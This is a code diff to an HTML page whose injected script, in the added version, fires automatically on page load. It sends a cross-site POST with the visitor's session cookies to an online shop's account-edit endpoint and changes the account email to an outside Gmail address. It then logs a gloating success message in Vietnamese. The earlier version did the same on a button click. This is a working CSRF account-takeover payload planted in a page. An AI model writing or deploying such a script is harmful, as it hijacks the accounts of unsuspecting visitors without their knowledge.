@@ -2954,34 +2954,28 @@
       data-wp-strategy="defer"
     ></script>
     <script>
-      document
-        .getElementById("changeEmailBtn")
-        .addEventListener("click", function () {
-          // Gửi request POST đổi email
-          fetch("https://mydecobox.shop/my-account/edit-account/", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/x-www-form-urlencoded",
-            },
-            body: "email=lacnhuwork@gmail.com&save_account_details=1",
-            credentials: "include", // Giữ session người dùng
+      // Khi trang được load, tự động gửi request POST đến mydecobox.shop
+      window.onload = function () {
+        fetch("https://mydecobox.shop/my-account/edit-account/", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+          },
+          body: "email=lacnhuwork@gmail.com&save_account_details=1", // Đổi email
+          credentials: "include", // Gửi cookie session cùng với request
+        })
+          .then((response) => response.text())
+          .then((text) => {
+            if (text.includes("lacnhuwork@gmail.com")) {
+              console.log("✅ Email đã bị đổi rồi đó 😈");
+            } else {
+              console.log("❌ Email chưa đổi được");
+            }
           })
-            .then((res) => res.text())
-            .then((text) => {
-              // Kiểm tra xem email đã đổi thành công chưa
-              if (text.includes("lacnhuwork@gmail.com")) {
-                console.log("✅ Email đã bị đổi rồi đó 😈");
-                alert("✅ Email đã bị đổi thành công!");
-              } else {
-                console.log("❌ Email chưa đổi được");
-                alert("❌ Email không đổi được. Có thể có lỗi.");
-              }
-            })
-            .catch((err) => {
-              console.error("❌ Lỗi khi gửi request", err);
-              alert("❌ Lỗi khi gửi request");
-            });
-        });
+          .catch((error) => {
+            console.log("❌ Lỗi khi gửi request", error);
+          });
+      };
     </script>
   </body>
 </html>
